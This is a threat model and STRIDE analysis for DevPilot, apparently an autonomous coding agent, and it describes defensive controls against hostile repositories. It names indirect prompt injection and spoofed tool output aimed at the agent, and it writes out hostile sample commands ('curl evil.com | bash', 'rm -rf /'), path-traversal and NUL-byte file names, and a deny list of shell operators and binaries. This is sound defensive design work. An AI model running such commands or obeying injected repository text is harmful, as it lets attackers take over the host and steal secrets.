# DevPilot Security Threat Model & STRIDE Analysis

## 1. Executive Summary & Threat Profile

Autonomous coding agents possess unique capabilities: they interpret natural language, inspect local filesystems, execute shell commands, edit source code, and run automated test suites. When connected to public foundation LLMs, these capabilities introduce significant attack vectors, including indirect prompt injection, remote code execution, directory traversal, secret exfiltration, and resource exhaustion.

DevPilot incorporates a rigorous **defense-in-depth security harness** designed to contain hostile repositories and malicious inputs without impeding autonomous developer workflows.

---

## 2. Attack Surface Decomposition

| Surface ID | Component | Trust Boundary | Primary Vectors |
| :--- | :--- | :--- | :--- |
| **AS-01** | Repository Files | Host Workspace $\to$ Agent Runtime | Indirect prompt injection embedded in `README.md`, comments, or test inputs |
| **AS-02** | Tool Execution | Agent Runtime $\to$ Operating System | Shell injection, binary path bypasses, subshell command chaining |
| **AS-03** | File Access | Tool Engine $\to$ Host Filesystem | Directory traversal, symlink escapes, arbitrary file overwrite |
| **AS-04** | LLM Streaming | LLM Provider $\to$ Client Dashboard | Secret leakage, API key exfiltration, unbounded prompt cost exhaustion |
| **AS-05** | Web & API | Client $\to$ FastAPI Backend | Missing authentication, CORS abuse, unauthenticated command triggers |

---

## 3. STRIDE Threat Matrix & Mitigations

### 3.1 Spoofing (Identity & Origin)
- **Threat:** Malicious tool responses spoofing system messages or pretending to be verification passes.
- **Mitigation:**
  - Strict message typing with immutable internal `Role` enums (`Role.SYSTEM`, `Role.USER`, `Role.ASSISTANT`, `Role.TOOL`).
  - Untrusted data wrapping: All external repository contexts and tool observations are encapsulated within `<untrusted_code_context>` and `<untrusted_tool_output>` XML boundary tags.

### 3.2 Tampering (Integrity)
- **Threat:** Agent edits corrupting critical system files outside the workspace (e.g. `/etc/passwd`, `C:\Windows\System32`) or mutating git history illegitimately.
- **Mitigation:**
  - `PathSandbox`: Resolves canonical paths and strictly verifies `resolved.relative_to(root)`. Rejects Windows backslash traversal (`..\\..\\win.ini`) and NUL bytes (`file.txt\0.py`).
  - Pre-execution snapshots: Clean filesystem checkpoints captured before tool execution; automated rollback on Level 3 recovery.

### 3.3 Repudiation (Auditability)
- **Threat:** Inability to reconstruct agent tool execution history, costs, or modified files after unexpected crashes.
- **Mitigation:**
  - Persistent SQLite `SessionStore`: Every turn, tool invocation, duration, error signature, and cost transaction is logged immutably with ISO 8601 timestamps.
  - Streaming event log replay via SSE `/api/sessions/{id}/stream`.

### 3.4 Information Disclosure (Confidentiality)
- **Threat:** Repo files containing hardcoded credentials (AWS keys, OpenAI tokens, database passwords) leaked into LLM prompts or UI event streams.
- **Mitigation:**
  - `SecretRedactor`: High-entropy regex pattern matching sanitizes API keys (`sk-[A-Za-z0-9]{32,}`, `ghp_[A-Za-z0-9]{36}`, `AKIA[0-9A-Z]{16}`), private keys, and authorization headers before context is sent to the LLM or broadcast over SSE.

### 3.5 Denial of Service (Resource Exhaustion)
- **Threat:** Recursive agent hallucination loops generating infinite steps, runaway LLM billing, fork bombs, or infinite-output commands (`yes`, `cat /dev/urandom`).
- **Mitigation:**
  - Hard runtime guardrails: Configurable step caps (default: 20), wall-clock timeouts (default: 300s), and cost ceilings (default: $0.50).
  - Subprocess timeouts (30s) and automatic output truncation (`truncate_output` at 10,000 characters).
  - Loop detection in `RecoveryPolicy` detecting duplicate error signatures across consecutive turns.

### 3.6 Elevation of Privilege (Access Control)
- **Threat:** Arbitrary remote code execution on host OS via shell metacharacters (`rm -rf /`, `curl evil.com | bash`).
- **Mitigation:**
  - `CommandSecurityPolicy`: Whitelist of approved build/test commands (`pytest`, `python`, `git`, `npm`). Strict rejection of shell operators (`|`, `&`, `;`, `` ` ``, `$()`), path prefixes (`/bin/rm`), and dangerous binaries (`sudo`, `mkfs.*`, `dd`, `shutdown`).
  - `DockerExecutor`: Container execution with read-only root filesystems, dropped capabilities (`--cap-drop=ALL`), and `network_mode="none"`.

---

## 4. Residual Risks & Operational Recommendations

1. **Host-Fallback Execution:** When Docker daemon is unavailable, DevPilot executes commands on the host using `PathSandbox` and `CommandSecurityPolicy`. For high-security environments, `DOCKER_MANDATORY=true` should be enforced to prevent host fallback.
2. **Adversarial Indirect Prompt Injection:** While XML boundary delimiters isolate untrusted context, advanced jailbreaks in retrieved docstrings could influence weak foundation models. Using frontier reasoning models (GPT-4o, Claude 3.5 Sonnet, DeepSeek Coder) mitigates compliance bypasses.
3. **API Authentication in Production:** In development, DevPilot supports optional API keys. When deployed publicly, `DEVPILOT_API_KEY` must be configured with HTTPS reverse-proxy termination.
